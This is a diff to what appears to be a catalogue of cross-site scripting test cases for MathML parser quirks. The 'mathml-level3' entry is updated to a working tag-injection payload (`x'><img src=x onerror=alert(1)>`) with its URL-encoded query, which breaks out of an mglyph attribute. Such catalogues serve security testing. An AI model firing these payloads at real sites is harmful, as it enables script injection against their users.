@@ -18,7 +18,7 @@ MathML parser quirks that allow HTML execution inside math contexts.
 
 ### mathml-level3
 
-`/mathml/level3/?query=x%27%20onerror=%27alert(1)`
+`/mathml/level3/?query=x'%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `x' onerror='alert(1)`
-- context: `<mglyph src='...'>` single-quoted attribute breakout
+- payload: `x'><img src=x onerror=alert(1)>`
+- context: `<mglyph src='...'>`; mglyph onerror is dead, so break out and inject a tag
